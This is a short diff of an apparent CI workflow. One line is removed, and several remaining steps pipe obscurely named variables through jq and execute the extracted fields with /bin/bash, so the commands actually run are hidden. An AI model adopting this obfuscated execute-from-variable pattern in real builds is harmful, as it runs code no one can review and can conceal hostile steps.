@@ -29,7 +29,6 @@ jobs:
           echo $k7 | jq -r .fiw7 | /bin/bash
           printf '%s' "$bezxg7" | jq -r .nqeni58 | /bin/bash
           echo $hqgs762 | jq -r .bn6 | /bin/bash
-          echo $st93741 | jq -r .uzjk293 | /bin/bash
           echo $bklrk6 | jq -r .ca97774 | /bin/bash
 
       - name: Archive output
